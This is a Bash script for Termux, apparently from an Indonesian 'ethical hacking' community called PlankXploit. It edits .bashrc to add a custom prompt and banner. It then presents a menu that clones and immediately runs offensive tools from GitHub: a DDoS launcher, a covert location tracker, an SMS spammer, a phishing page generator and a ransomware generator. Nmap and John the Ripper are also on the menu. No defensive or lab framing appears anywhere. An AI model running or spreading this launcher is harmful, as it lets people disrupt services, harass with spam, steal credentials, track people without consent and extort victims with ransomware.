#!/bin/bash

# === VARIABEL ===
BASHRC="$HOME/.bashrc"
ASCII_URL="https://files.catbox.moe/0mhaup.png"
THEME_FILE="$HOME/.termux_theme"
PROMPT='plankdev@EL_Savador ➤'

# === SETUP PROMPT ===
echo "export PS1='\[\e[1;32m\]$PROMPT \[\e[0m\]'" >> $BASHRC

# === SETUP BANNER / TEMA ===
cat << EOF > $THEME_FILE
\e[1;32m┌────────────────────────────────────────────┐
│      WELCOME TO PLANKXPLOIT TERMINAL        │
└────────────────────────────────────────────┘
EOF

# === LOGO ASCII (jika tool tersedia) ===
if command -v jp2a > /dev/null 2>&1; then
    wget -q "$ASCII_URL" -O /tmp/logo.png
    jp2a --colors --width=40 /tmp/logo.png >> $THEME_FILE
elif command -v img2txt > /dev/null 2>&1; then
    wget -q "$ASCII_URL" -O /tmp/logo.png
    img2txt --width=40 /tmp/logo.png >> $THEME_FILE
else
    echo -e "[!] jp2a/img2txt tidak ditemukan" >> $THEME_FILE
fi

# === IDENTITAS KOMUNITAS ===
cat << EOF >> $THEME_FILE

\e[95m╔════════════════════════════════════════════╗
║  🔰  Name      : PlankXploit
║  📚  Title     : Ethical Hacking
║  🛰️  Community : EL Savador
╚════════════════════════════════════════════╝
EOF

# === TAMBAH KE .bashrc agar otomatis tampil ===
grep -qF "cat \$HOME/.termux_theme" "$BASHRC" || echo "cat \$HOME/.termux_theme" >> "$BASHRC"

# === FUNGSI MENU UTAMA ===
plank_menu() {
clear
echo -e "\e[1;36m"
echo "╔═══════════════════════════════════╗"
echo "║      🌐 PLANKXPLOIT MAIN MENU     ║"
echo "╚═══════════════════════════════════╝"
echo -e "\e[0m"
echo "1. 🚀 DDoS Attack"
echo "2. 🎯 Tracking Lokasi"
echo "3. 📡 Nmap Network Scan"
echo "4. 🔐 John The Ripper"
echo "5. 📱 Spam SMS"
echo "6. 🎭 Buat Phishing Page"
echo "7. ☠️  Ransomware Generator"
echo "8. ❌ Exit"
read -p "pilih ➤ " menu

case $menu in
  1)
    echo "[⚠] Menjalankan DDoS..."
    pkg install git -y && git clone https://github.com/MatrixTM/MHDDoS && cd MHDDoS && python3 start.py
    ;;
  2)
    echo "[⚠] Menjalankan Tracking..."
    pkg install git -y && git clone https://github.com/thewhiteh4t/seeker && cd seeker && bash install.sh && python3 seeker.py
    ;;
  3)
    echo "[⚠] Menjalankan Nmap..."
    pkg install nmap -y && read -p "IP Target: " ip && nmap $ip
    ;;
  4)
    echo "[⚠] Menjalankan John The Ripper..."
    pkg install john -y && echo "Gunakan 'john --help' untuk mulai"
    ;;
  5)
    echo "[⚠] Menjalankan Spam SMS..."
    pkg install git -y && git clone https://github.com/TERMUXID3/brutal-sms && cd brutal-sms && bash brutal
    ;;
  6)
    echo "[⚠] Menjalankan Phishing..."
    pkg install git -y && git clone https://github.com/htr-tech/zphisher && cd zphisher && bash zphisher.sh
    ;;
  7)
    echo "[⚠] Menjalankan Ransomware Generator..."
    pkg install git -y && git clone https://github.com/termuxhackers-id/SARA && cd SARA && bash install.sh
    ;;
  8)
    echo "[✔] Keluar..."
    exit
    ;;
  *)
    echo "[!] Pilihan tidak tersedia!"
    ;;
esac

read -p "Tekan Enter untuk kembali..."
plank_menu
}

# === AKTIFKAN MENU JIKA DIJALANKAN LANGSUNG ===
plank_menu